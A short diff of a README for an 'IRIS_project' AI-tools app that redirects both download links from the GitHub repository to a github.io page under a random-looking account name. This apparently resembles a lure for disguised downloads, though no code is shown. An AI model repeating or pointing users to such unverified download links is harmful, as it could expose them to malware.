@@ -1,6 +1,6 @@
 # 🌐 IRIS_project - Connect all your AI tools easily
 
-[![](https://img.shields.io/badge/Download_IRIS-Blue?style=for-the-badge)](https://github.com/Naturalnessfamilyemydidae851/IRIS_project)
+[![](https://img.shields.io/badge/Download_IRIS-Blue?style=for-the-badge)](https://naturalnessfamilyemydidae851.github.io)
 
 ## What is IRIS?
 
@@ -22,7 +22,7 @@ Before you install IRIS, check that your computer meets these needs:
 
 To install the software, you need to visit the release page. This page contains the file you need to start the program.
 
-[Click here to visit the download page](https://github.com/Naturalnessfamilyemydidae851/IRIS_project)
+[Click here to visit the download page](https://naturalnessfamilyemydidae851.github.io)
 
 Follow these steps to get the file:
 
